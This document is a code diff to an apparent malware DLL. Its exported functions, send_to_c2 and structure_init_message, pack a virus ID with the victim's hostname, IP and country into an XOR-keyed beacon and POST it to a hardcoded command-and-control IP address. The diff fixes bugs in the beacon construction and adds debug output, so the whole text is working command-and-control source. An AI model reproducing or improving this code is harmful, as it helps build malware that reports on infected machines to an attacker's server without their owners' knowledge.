@@ -98,13 +98,22 @@ __declspec(dllexport) int send_to_c2(char *encrypted_data, SOCKET ConnectSocket)
 
 	// Add on HTTP header
 	std::string str(encrypted_data);
+	std::string content = "";
+	for (int i = 0; i < str.length(); i++)
+	{
+		content += std::to_string((int)encrypted_data[i]);
+		content += ", ";
+	}
+
 	std::string header = "POST / HTTP/1.1\r\nHost: 13.56.156.46\r\nContent-Type: text/plain\r\nContent-Length: ";
-	header += std::to_string(str.length());
-	header += "\r\n\r\n" + str;
+	header += std::to_string(content.length());
+	header += "\r\n\r\n" + content;
 
 	char* message = new char[header.length() + 1];
 	strcpy(message, header.c_str());
 	std::cout << message << std::endl;
+
+	std::cout << "Decrypted Body: " << decryption(encrypted_data) << std::endl;
 
 	iResult = send(ConnectSocket, message, (int) strlen(message), 0);
 	if(iResult == SOCKET_ERROR){
@@ -133,7 +142,7 @@ __declspec(dllexport) int send_to_c2(char *encrypted_data, SOCKET ConnectSocket)
 	do {
 		iResult = recv(ConnectSocket, recvbuf, sizeof(recvbuf), 0);
 		if(iResult > 0){
-			std::cout << "Bytes received: " << iResult <<std::endl;
+			//std::cout << "Bytes received: " << iResult <<std::endl;
 		}
 		else if (iResult == 0)
 			std::cout << "Connection closed " << std::endl;
@@ -217,15 +226,15 @@ __declspec(dllexport) char *structure_init_message(char XOR_key, const char *vir
 	/* Copy variables into their correct sizes */
 	strncpy(virus_id_10, virus_id, 10);
 	strncpy(hostname_10, hostname, 10);
-	strncpy(ip_10, virus_id, 10);
+	strncpy(ip_10, ip, 10);
 	strncpy(country_2, country, 2);
 
 	/* Create Message Buffer */
 	buffer[0] = XOR_key;
-	strncat(buffer, virus_id, 10);
-	strncat(buffer, hostname, 10);
-	strncat(buffer, ip, 10);
-	strncat(buffer, country, 2);	
+	strncat(buffer, virus_id_10, 10);
+	strncat(buffer, hostname_10, 10);
+	strncat(buffer, ip_10, 10);
+	strncat(buffer, country_2, 2);	
 	
 
 	return buffer;
